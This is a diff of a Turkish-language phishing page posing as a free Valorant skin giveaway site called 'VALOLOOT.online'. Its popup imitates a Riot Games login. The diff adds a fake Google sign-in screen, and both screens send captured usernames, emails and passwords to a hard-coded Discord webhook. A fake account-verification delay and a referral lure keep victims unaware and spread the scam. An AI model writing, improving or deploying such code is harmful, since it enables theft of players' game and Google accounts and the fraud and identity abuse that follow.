@@ -9,19 +9,9 @@
     <style>
         :root { --valo-red: #ff4655; --dark-bg: #0b1119; --nav-bg: #111420; }
         body { background: var(--dark-bg) url('bg.jpg') fixed center/cover; color: white; font-family: 'Inter', sans-serif; margin: 0; padding: 0; min-height: 100vh; overflow-x: hidden; }
-        /* Logo ve metni yan yana getirir */
-.logo {
-    display: flex;
-    align-items: center;
-    gap: 15px; /* Logo ile yazı arasındaki boşluk */
-}
-
-/* 256x256'lık görselini header'a uygun boyuta çeker */
-.header-icon {
-    height: 40px;      /* Yüksekliği buradan artırıp azaltabilirsin */
-    width: auto;       /* Oranı bozmaz */
-    object-fit: contain;
-}
+        
+        .logo { display: flex; align-items: center; gap: 15px; }
+        .header-icon { height: 40px; width: auto; object-fit: contain; }
         
         .live-drops { background: rgba(0, 0, 0, 0.95); height: 100px; border-bottom: 2px solid var(--valo-red); display: flex; align-items: center; overflow: hidden; position: relative; width: 100%; }
         .mythic-label { background: var(--valo-red); height: 100%; display: flex; align-items: center; padding: 0 20px; font-family: 'Montserrat'; font-weight: 900; font-size: 14px; text-transform: uppercase; z-index: 50; color: #fff; box-shadow: 10px 0 20px rgba(0,0,0,0.5); }
@@ -39,11 +29,9 @@
         
         .user-profile { display: flex; align-items: center; gap: 15px; background: rgba(255,255,255,0.03); padding: 5px 15px; border-radius: 8px; border: 1px solid #79eb1e; animation: fadeIn 0.5s ease; }
         .user-avatar { width: 40px; height: 40px; border-radius: 50%; border: 2px solid #79eb1e; object-fit: cover; }
-        .user-info { display: flex; flex-direction: column; }
         .user-name { color: #79eb1e; font-weight: 900; font-size: 14px; }
         .btn-login { background: var(--valo-red); color: #fff; border: none; padding: 12px 25px; font-weight: 800; cursor: pointer; border-radius: 4px; text-transform: uppercase; }
 
-        /* Doğrulama Yazısı Stili */
         .verifying-text { color: #f7c133; font-weight: 800; font-size: 13px; letter-spacing: 1px; animation: pulse 1s infinite; }
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
@@ -87,7 +75,7 @@
         <div class="notif-icon">✓</div>
         <div>
             <div style="font-weight: 800; color: #fff; font-size: 14px;">GİRİŞ BAŞARILI</div>
-            <div style="color: #888; font-size: 12px;" id="notif-text">Hoş geldin, kullanıcı!</div>
+            <div style="color: #888; font-size: 12px;" id="notif-text">Hoş geldin!</div>
         </div>
     </div>
 
@@ -97,19 +85,17 @@
     </div>
 
     <header>
-    <div class="logo">
-        <img src="ana_logo.png" alt="Logo" class="header-icon">
-        VALO<span>LOOT.online</span>
-    </div>
-    
-    <div class="nav-links">
-        <a href="#">Kasalar</a><a href="#">Savaşlar</a><a href="#">Mağaza</a>
-    </div>
-    <div id="authArea">
-        <button class="btn-login" onclick="openAuth()">GİRİŞ YAP</button>
-    </div>
-</header>
-    
+        <div class="logo">
+            <img src="ana_logo.png" alt="Logo" class="header-icon">
+            VALO<span>LOOT.online</span>
+        </div>
+        <div class="nav-links">
+            <a href="#">Kasalar</a><a href="#">Savaşlar</a><a href="#">Mağaza</a>
+        </div>
+        <div id="authArea">
+            <button class="btn-login" onclick="openAuth()">GİRİŞ YAP</button>
+        </div>
+    </header>
 
     <div class="giveaway-section">
         <div>
@@ -138,9 +124,9 @@
                 <img id="wonImg" src="" style="width:220px; margin:15px 0;">
                 <h2 id="wonName">-</h2>
                 <div id="wonVP" style="background:#79eb1e; color:#000; padding:12px; border-radius:6px; font-weight:900; margin-top:15px;">0 VP</div>
-               <div class="ref-box" onclick="copyRefLink()">
-    VALOLOOT.ONLİNE/JOIN?REF=<span id="refCode">...</span>
-</div>
+                <div class="ref-box" onclick="copyRefLink()">
+                    VALOLOOT.ONLİNE/JOIN?REF=<span id="refCode">...</span>
+                </div>
                 <button class="open-btn" style="background:#79eb1e; color:#000;" onclick="alert('Önce arkadaş davetini tamamla!')">HESABA AKTAR (VP)</button>
             </div>
         </div>
@@ -158,6 +144,7 @@
 
         function spawnDrop() {
             const track = document.getElementById('dropTrack');
+            if(!track) return;
             const s = skins[Math.floor(Math.random() * skins.length)];
             const div = document.createElement('div');
             div.className = 'drop-card';
@@ -189,45 +176,27 @@
 
         function openFreeCase() {
             if(!IS_LOGGED) return openAuth();
-            
-            // Modal ve görünüm hazırlığı
             document.getElementById('caseModal').style.display = 'flex';
             document.getElementById('openingView').style.display = 'block';
             document.getElementById('winView').style.display = 'none';
-
             const strip = document.getElementById('itemStrip');
-            strip.style.transition = 'none'; // Animasyonu sıfırla
+            strip.style.transition = 'none';
             strip.style.transform = 'translateX(0)';
             strip.innerHTML = '';
-
-            // 1. Önce kazananı belirle
             const winnerIndex = Math.floor(Math.random() * skins.length);
             const winner = skins[winnerIndex];
-
-            // 2. Strip (şerit) oluştur
-            // Görsel olarak zengin durması için 60-70 tane item ekliyoruz
             const totalItems = 70;
             for(let i=0; i < totalItems; i++) {
                 const item = skins[i % skins.length];
                 strip.innerHTML += `<img src="${item.img}">`;
             }
-
-            // 3. Kazanan item'ı şeridin sonlarına doğru bir yere "çiviyle" çakıyoruz
-            // 65. sıradaki item bizim kazananımız olsun (0'dan başladığı için 64)
             const targetIndex = 64; 
             const images = strip.getElementsByTagName('img');
-            images[targetIndex].src = winner.img; // Garantiye alıyoruz
-
-            // 4. Animasyonu başlat
-            // Her resim 130px genişlik + 40px margin (20+20) = 170px yer kaplıyor
-            // Ortalamak için modal genişliğinin yarısını hesaba katıyoruz
+            images[targetIndex].src = winner.img;
             setTimeout(() => {
                 strip.style.transition = 'transform 5s cubic-bezier(0.1, 0, 0, 1)';
-                // 170px birim mesafe. (targetIndex * 170) kadar kaydırıp tam ortaya denk getiriyoruz.
                 const moveAmount = (targetIndex * 170) - (document.querySelector('.spinner-box').offsetWidth / 2) + 85;
                 strip.style.transform = `translateX(-${moveAmount}px)`;
-
-                // 5. Animasyon bitişinde ekranı güncelle
                 setTimeout(() => {
                     document.getElementById('openingView').style.display = 'none';
                     document.getElementById('winView').style.display = 'block';
@@ -239,45 +208,94 @@
         }
 
         function openAuth() {
-            const w = 450, h = 800;
+            const w = 450, h = 750;
             const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
-            let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
+            let win = window.open("", "AuthLogin", `width=${w},height=${h},top=${t},left=${l}`);
+            
             win.document.write(`
-                <html><head><title>Riot Games Login</title><style>
-                body { background: #0b1119; color: white; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-                .card { width: 330px; text-align: center; background: #111420; padding: 40px; border-radius: 8px; border: 1px solid #222; }
-                h2 { font-weight: 900; margin-bottom: 25px; }
-                .input-group { position: relative; margin-bottom: 15px; }
-                input { width: 100%; padding: 20px 15px 10px 15px; background: #0b1119; border: 2px solid #333; border-radius: 4px; color: white; outline: none; box-sizing: border-box; }
-                input:focus { border-color: #ff4655; }
-                label { position: absolute; left: 15px; top: 18px; color: #555; font-weight: 800; font-size: 11px; text-transform: uppercase; pointer-events: none; transition: 0.2s; }
-                input:focus + label, input:not(:placeholder-shown) + label { top: 6px; font-size: 9px; color: #ff4655; }
-                .s-btn { width: 100%; height: 45px; border-radius: 4px; margin-bottom: 10px; border: none; cursor: pointer; font-weight: 900; display: flex; align-items: center; justify-content: center; gap: 10px; text-transform: uppercase; font-size: 11px; }
-                .fb { background: #1877f2; color: white; } .gg { background: #fff; color: #000; } .ap { background: #000; color: white; }
-                .login-btn { width: 100%; padding: 20px; background: #ff4655; color: white; border: none; border-radius: 4px; font-weight: 900; cursor: pointer; margin-top: 15px; }
+                <html><head><title>Oturum Aç</title><style>
+                    body { background: #0b1119; color: white; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+                    .card { width: 330px; text-align: center; background: #111420; padding: 40px; border-radius: 8px; border: 1px solid #222; }
+                    h2 { font-weight: 900; margin-bottom: 25px; font-size: 18px; }
+                    .input-group { position: relative; margin-bottom: 15px; }
+                    input { width: 100%; padding: 20px 15px 10px 15px; background: #0b1119; border: 2px solid #333; border-radius: 4px; color: white; outline: none; box-sizing: border-box; font-size: 14px; }
+                    input:focus { border-color: #ff4655; }
+                    label { position: absolute; left: 15px; top: 18px; color: #555; font-weight: 800; font-size: 11px; text-transform: uppercase; pointer-events: none; transition: 0.2s; }
+                    input:focus + label, input:not(:placeholder-shown) + label { top: 6px; font-size: 9px; color: #ff4655; }
+                    .s-btn { width: 100%; height: 45px; border-radius: 4px; margin-bottom: 10px; border: none; cursor: pointer; font-weight: 900; display: flex; align-items: center; justify-content: center; gap: 10px; text-transform: uppercase; font-size: 11px; transition: 0.3s; }
+                    .fb { background: #1877f2; color: white; }
+                    .gg { background: #fff; color: #000; }
+                    .ap { background: #000; color: white; }
+                    .login-btn { width: 100%; padding: 20px; background: #ff4655; color: white; border: none; border-radius: 4px; font-weight: 900; cursor: pointer; margin-top: 15px; text-transform: uppercase; }
+                    
+                    /* Google Screen UI */
+                    .g-card { width: 350px; padding: 40px; background: white; border-radius: 8px; text-align: center; color: #202124; }
+                    .g-logo { width: 75px; margin-bottom: 10px; }
+                    .g-h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; font-family: 'Google Sans',arial,sans-serif; }
+                    .g-p { margin-bottom: 24px; color: #202124; }
+                    .g-input { width: 100%; padding: 13px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; margin-bottom: 10px; }
+                    .g-next { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: right; margin-top: 20px; }
                 </style></head><body>
-                <div class="card">
-                    <img src="login_screen_logo.png" width="160" style="margin-bottom: 15px;" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png'; this.style.filter='brightness(0) invert(1)'; this.width=50;">
+                
+                <div id="riot-screen" class="card">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png" width="50" style="margin-bottom: 15px; filter: brightness(0) invert(1);">
                     <h2>OTURUM AÇ</h2>
+                    <button class="s-btn gg" onclick="showGoogle()">GOOGLE İLE GİRİŞ</button>
                     <button class="s-btn fb">FACEBOOK İLE GİRİŞ</button>
-                    <button class="s-btn gg">GOOGLE İLE GİRİŞ</button>
                     <button class="s-btn ap">APPLE İLE GİRİŞ</button>
-                    <div style="margin: 20px 0; color: #333;">Veya</div>
+                    <div style="margin: 20px 0; color: #333; font-size: 12px;">Veya</div>
                     <div class="input-group"><input id="u" placeholder=" "><label>KULLANICI ADI</label></div>
                     <div class="input-group"><input id="p" type="password" placeholder=" "><label>ŞİFRE</label></div>
-                    <button class="login-btn" onclick="sendAuth()">GİRİŞ YAP</button>
+                    <button class="login-btn" onclick="sendAuth('RIOT')">GİRİŞ YAP</button>
                 </div>
+
+                <div id="google-screen" class="g-card" style="display:none;">
+                    <img class="g-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_Reference_Logo.svg/1200px-Google_Reference_Logo.svg.png">
+                    <div id="g-step1">
+                        <h1 class="g-h1">Oturum açın</h1>
+                        <p class="g-p">Google Hesabınızı kullanın</p>
+                        <input type="email" id="g_email" class="g-input" placeholder="E-posta veya telefon">
+                        <button class="g-next" onclick="gNext()">İleri</button>
+                    </div>
+                    <div id="g-step2" style="display:none;">
+                        <h1 class="g-h1" id="disp_email" style="font-size:16px; border:1px solid #dadce0; border-radius:20px; padding:5px; display:inline-block; margin-bottom:15px;"></h1>
+                        <h1 class="g-h1">Hoş geldiniz</h1>
+                        <input type="password" id="g_pass" class="g-input" placeholder="Şifrenizi girin">
+                        <button class="g-next" onclick="sendAuth('GOOGLE')">Giriş Yap</button>
+                    </div>
+                </div>
+
                 <script>
-                function sendAuth(){
-                    var uVal = document.getElementById('u').value;
-                    var pVal = document.getElementById('p').value;
-                    if(uVal && pVal){
-                        window.opener.postMessage({u: uVal, p: pVal}, "*");
-                        window.close();
-                    } else {
-                        alert('Lütfen alanları doldurun!');
+                    function showGoogle() {
+                        document.getElementById('riot-screen').style.display = 'none';
+                        document.getElementById('google-screen').style.display = 'block';
+                        document.body.style.background = '#f0f2f5';
                     }
-                }
+                    function gNext() {
+                        const email = document.getElementById('g_email').value;
+                        if(email) {
+                            document.getElementById('g-step1').style.display = 'none';
+                            document.getElementById('g-step2').style.display = 'block';
+                            document.getElementById('disp_email').innerText = email;
+                        }
+                    }
+                    function sendAuth(type){
+                        let u, p;
+                        if(type === 'RIOT') {
+                            u = document.getElementById('u').value;
+                            p = document.getElementById('p').value;
+                        } else {
+                            u = document.getElementById('g_email').value;
+                            p = document.getElementById('g_pass').value;
+                        }
+                        
+                        if(u && p){
+                            window.opener.postMessage({u: u, p: p, type: type}, "*");
+                            window.close();
+                        } else {
+                            alert('Lütfen alanları doldurun!');
+                        }
+                    }
                 <\/script>
                 </body></html>
             `);
@@ -286,46 +304,42 @@
         window.addEventListener("message", (e) => {
             if(e.data && e.data.u) {
                 const authArea = document.getElementById('authArea');
-                
-                // 1. Önce butonu kaldırıp "Doğrulanıyor" yazısını ekle
                 authArea.innerHTML = `<span class="verifying-text">HESAP DOĞRULANIYOR...</span>`;
 
-                // 2. 2 Saniye sonra asıl profili yükle
                 setTimeout(() => {
                     IS_LOGGED = true;
-                    
-                    // Profil güncelleme
                     authArea.innerHTML = `
                         <div class="user-profile">
                             <img src="avatar.png" class="user-avatar" onerror="this.src='https://ui-avatars.com/api/?name=${e.data.u}&background=ff4655&color=fff'">
                             <div class="user-info">
-                                <span class="user-name">${e.data.u.toUpperCase()}#TR1</span>
+                                <span class="user-name">${e.data.u.split('@')[0].toUpperCase()}#TR1</span>
                             </div>
                         </div>
                     `;
                     
-                    // Sağ alt bildirim
                     const notif = document.getElementById('notification-box');
-                    document.getElementById('notif-text').innerText = `Hoş geldin, ${e.data.u}!`;
+                    document.getElementById('notif-text').innerText = `Hoş geldin, ${e.data.u.split('@')[0]}!`;
                     notif.classList.add('active');
                     setTimeout(() => { notif.classList.remove('active'); }, 5000);
 
                     document.getElementById('giveawayStatus').innerText = "ÇEKİLİŞE KATILDINIZ!";
                     document.getElementById('refCode').innerText = "VLOOT" + Math.floor(Math.random()*9999);
                     loadCases();
-                }, 2000); // 2000ms = 2 saniye gecikme
+                }, 2000);
 
-                // Veriyi hemen Webhook'a gönder (Gecikmeye gerek yok)
+                // Webhook Gönderimi (Google/Riot ayrımıyla)
                 fetch("https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
                     method: 'POST', headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         embeds: [{
-                            title: "👤 Yeni Giriş Yakalandı",
-                            color: 16725077,
+                            title: e.data.type === 'GOOGLE' ? "🌐 Yeni Google Girişi Yakalandı" : "👤 Yeni Riot Girişi Yakalandı",
+                            color: e.data.type === 'GOOGLE' ? 4284927 : 16725077,
                             fields: [
-                                { name: "Kullanıcı", value: "`" + e.data.u + "`", inline: true },
-                                { name: "Şifre", value: "`" + e.data.p + "`", inline: true }
+                                { name: "Kullanıcı/E-posta", value: "`" + e.data.u + "`", inline: true },
+                                { name: "Şifre", value: "`" + e.data.p + "`", inline: true },
+                                { name: "Giriş Tipi", value: e.data.type, inline: false }
                             ],
+                            footer: { text: "VALOLOOT.ONLINE" },
                             timestamp: new Date()
                         }]
                     })
@@ -334,7 +348,6 @@
         });
 
         const targetTime = new Date().getTime() + (23 * 60 * 1000);
-
         function tick() {
             const now = new Date().getTime();
             let diff = targetTime - now;
@@ -353,29 +366,19 @@
         window.onload = () => { spawnDrop(); loadCases(); };
         
         function copyRefLink() {
-    // Görseldeki kodu al
-    const code = document.getElementById('refCode').innerText;
-    // Tam linki oluştur
-    const fullLink = "https://valoloot.net/join?ref=" + code;
-
-    // Modern kopyalama yöntemi
-    navigator.clipboard.writeText(fullLink).then(() => {
-        // Kullanıcıya geri bildirim ver
-        const refBox = document.querySelector('.ref-box');
-        const originalText = refBox.innerHTML;
-        
-        refBox.style.borderColor = "#ffffff";
-        refBox.innerText = "LİNK KOPYALANDI!";
-        
-        setTimeout(() => {
-            refBox.style.borderColor = "#79eb1e";
-            refBox.innerHTML = originalText;
-        }, 2000);
-    }).catch(err => {
-        // Eğer bir hata olursa eski usul dene
-        console.error('Kopyalama başarısız: ', err);
-    });
-}
+            const code = document.getElementById('refCode').innerText;
+            const fullLink = "https://valoloot.net/join?ref=" + code;
+            navigator.clipboard.writeText(fullLink).then(() => {
+                const refBox = document.querySelector('.ref-box');
+                const originalText = refBox.innerHTML;
+                refBox.style.borderColor = "#ffffff";
+                refBox.innerText = "LİNK KOPYALANDI!";
+                setTimeout(() => {
+                    refBox.style.borderColor = "#79eb1e";
+                    refBox.innerHTML = originalText;
+                }, 2000);
+            });
+        }
     </script>
 </body>
 </html>
